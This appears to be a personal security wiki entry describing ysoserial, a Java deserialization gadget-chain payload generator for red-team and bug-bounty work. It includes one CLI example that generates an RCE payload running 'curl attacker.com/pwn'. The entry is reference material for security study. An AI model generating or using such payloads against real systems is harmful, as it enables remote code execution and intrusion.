---
title: "ysoserial (Java Deserialization Payload Generator)"
created: 2026-09-25
updated: 2026-09-25
type: entity
tags:
  - tool
  - deserialization
  - rce
  - payload
sources:
  - unprocessed-obsidians/insecure-deserialization.md
confidence: high
contested: false
contradictions: []
parent: "[[web-and-bug-bounty]]"
cluster: web-and-bug-bounty
---
# ysoserial (Java Deserialization Payload Generator)

## Overview
ysoserial (authored by frohoff) is the pioneering proof-of-concept tool for generating Java deserialization gadget chains. It exploits common Java libraries in classpaths to achieve arbitrary command execution when untrusted `ObjectInputStream.readObject()` calls are invoked.

- **Repository**: [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- **Documentation**: [https://github.com/frohoff/ysoserial/blob/master/README.md](https://github.com/frohoff/ysoserial/blob/master/README.md)

## Core Capabilities & Operational Modules
- **Extensive Gadget Chains**: Covers CommonsCollections 1-7, Spring1/2, Groovy1, BeanShell1, ROME, Hibernate, JSON, and Jython.
- **Native RCE Delivery**: Executes arbitrary commands via Java `Runtime.getRuntime().exec()` or reflective bytecode classloading.
- **Payload Formatting**: Outputs raw binary serialized streams, Base64 strings, or encoded URL parameters ready for web injection.
- **JRMP Listeners & Clients**: Includes JRMP client and listener modules to trigger out-of-band RMI remote classloading.

## CLI Execution & Syntax Examples
```bash
# Generate CommonsCollections6 RCE payload
java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/pwn" | base64 -w 0
```

## Integration in Offensive Workflows
This entity serves as a core automation and execution primitive within modern red-team and bug-bounty pipelines. It bridges the gap between theoretical attack patterns and operational verification.

## Primary Sources & Provenance
Ingested and structured from canonical notes:
  - unprocessed-obsidians/insecure-deserialization.md

## Related Notes & Concepts
- [[deserialization-attacks]]
- [[vulnerability-research-methodology]]

## Related Pages
- [[web-and-bug-bounty]]
